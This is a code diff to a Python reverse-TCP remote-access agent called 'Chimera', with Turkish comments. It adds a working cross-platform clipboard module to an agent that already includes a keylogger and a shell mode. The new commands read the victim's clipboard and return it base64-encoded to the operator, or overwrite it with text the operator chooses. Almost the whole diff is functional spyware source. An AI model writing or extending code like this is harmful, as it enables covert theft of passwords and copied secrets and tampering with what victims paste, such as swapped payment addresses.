@@ -240,6 +240,127 @@ class Keylogger:
         self.logs = [] # Okunanları sil
         return "\n".join(output)
 
+class ClipboardManager:
+    """
+    Platform bağımsız panoya erişim yöneticisi.
+    Windows (ctypes), macOS (pbcopy/pbpaste), Linux (xclip/xsel).
+    """
+    def get_text(self):
+        """Panodaki metni okur."""
+        if sys.platform == "win32":
+            try:
+                import ctypes
+                from ctypes import windll, c_char_p, c_wchar_p
+                
+                user32 = windll.user32
+                kernel32 = windll.kernel32
+                
+                if not user32.OpenClipboard(None):
+                    return "[!] Pano açılamadı (Meşgul olabilir)."
+                
+                try:
+                    # CF_UNICODETEXT = 13
+                    h_data = user32.GetClipboardData(13)
+                    if not h_data:
+                        # CF_TEXT = 1 (ASCII fallback)
+                        h_data = user32.GetClipboardData(1)
+                        if not h_data:
+                            return "[!] Pano boş veya metin içermiyor."
+                    
+                    p_text = kernel32.GlobalLock(h_data)
+                    if not p_text:
+                        return "[!] Veri kilitlenemedi."
+                        
+                    try:
+                        text = ctypes.c_wchar_p(p_text).value
+                    except:
+                        text = ctypes.c_char_p(p_text).value.decode('cp1254', errors='ignore')
+                        
+                finally:
+                    kernel32.GlobalUnlock(h_data)
+                    user32.CloseClipboard()
+                
+                return text
+            except Exception as e:
+                return f"[!] Pano okuma hatası: {str(e)}"
+                
+        elif sys.platform == "darwin":
+            try:
+                return subprocess.check_output("pbpaste", shell=True).decode('utf-8')
+            except:
+                return "[!] pbpaste komutu çalışmadı."
+                
+        else: # Linux
+            try:
+                # xclip veya xsel dene
+                try:
+                    return subprocess.check_output("xclip -o -selection clipboard", shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
+                except:
+                    return subprocess.check_output("xsel -o -b", shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
+            except:
+                return "[!] Linux panosuna erişilemedi (xclip/xsel yüklü mü?)."
+
+    def set_text(self, text):
+        """Panoya metin yazar."""
+        if sys.platform == "win32":
+            try:
+                import ctypes
+                from ctypes import windll, c_size_t
+                
+                user32 = windll.user32
+                kernel32 = windll.kernel32
+                
+                if not user32.OpenClipboard(None):
+                    return False
+                
+                try:
+                    user32.EmptyClipboard()
+                    
+                    # Metni belleğe hazırla
+                    text_bytes = text.encode('utf-16le') + b'\x00\x00'
+                    alloc_size = len(text_bytes)
+                    
+                    # GHND = 0x0042 (GMEM_MOVEABLE | GMEM_ZEROINIT)
+                    h_mem = kernel32.GlobalAlloc(0x0042, alloc_size)
+                    p_mem = kernel32.GlobalLock(h_mem)
+                    
+                    ctypes.memmove(p_mem, text_bytes, alloc_size)
+                    kernel32.GlobalUnlock(h_mem)
+                    
+                    # CF_UNICODETEXT = 13
+                    if not user32.SetClipboardData(13, h_mem):
+                         return False
+                finally:
+                    user32.CloseClipboard()
+                return True
+            except:
+                return False
+                
+        elif sys.platform == "darwin":
+            try:
+                p = subprocess.Popen("pbcopy", stdin=subprocess.PIPE, shell=True)
+                p.communicate(input=text.encode('utf-8'))
+                return p.returncode == 0
+            except:
+                return False
+                
+        else: # Linux
+            try:
+                # xclip
+                p = subprocess.Popen("xclip -selection clipboard", stdin=subprocess.PIPE, shell=True)
+                p.communicate(input=text.encode('utf-8'))
+                if p.returncode == 0: return True
+            except:
+                pass
+                
+            try:
+                # xsel fallback
+                p = subprocess.Popen("xsel -b -i", stdin=subprocess.PIPE, shell=True)
+                p.communicate(input=text.encode('utf-8'))
+                return p.returncode == 0
+            except:
+                return False
+
 class ChimeraAgent:
 
     """Chimera Core Agent - Temel reverse TCP ajanı."""
@@ -251,6 +372,7 @@ class ChimeraAgent:
         self.running = True
         self.loaded_modules = {}  # Yüklü modülleri saklar: {name: module_obj}
         self.keylogger = Keylogger() # Keylogger modülü
+        self.clipboard = ClipboardManager() # Clipboard modülü
 
     # --------------------------------------------------------
     # Bağlantı Yönetimi
@@ -1278,7 +1400,33 @@ class ChimeraAgent:
             # Logları Base64 encode et (Transfer güvenliği için)
             b64_logs = base64.b64encode(logs.encode('utf-8')).decode('utf-8')
             return f"KEYLOG_DUMP:{b64_logs}"
+
+        # Clipboard Komutları
+        if cmd_lower == "clipboard_get":
+            content = self.clipboard.get_text()
+            if not content:
+                content = "[Pano Boş]"
             
+            # İçeriği güvenli transfer için base64 ile kodla
+            # (Özel karakterler veya newlinelar protokolü bozmasın diye)
+            b64_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
+            return f"CLIPBOARD_DATA:{b64_content}"
+            
+        if cmd_lower.startswith("clipboard_set "):
+            try:
+                # Komuttan metni ayır (clipboard_set <text>)
+                text_to_set = cmd[14:].strip() # "clipboard_set " uzunluğu 14
+                
+                # Eğer base64 olarak gönderilmişse decode et (opsiyonel, şimdilik raw text)
+                # Ancak kullanıcı direkt "clipboard_set hello world" yazarsa raw metindir.
+                
+                if self.clipboard.set_text(text_to_set):
+                    return f"[+] Pano içeriği değiştirildi: '{text_to_set[:20]}...'"
+                else:
+                    return "[!] Pano içeriği değiştirilemedi."
+            except Exception as e:
+                return f"[!] Pano yazma hatası: {str(e)}"
+
         # Özel komutlar - Shell
         if cmd_lower == "shell":
             return self.shell_mode()
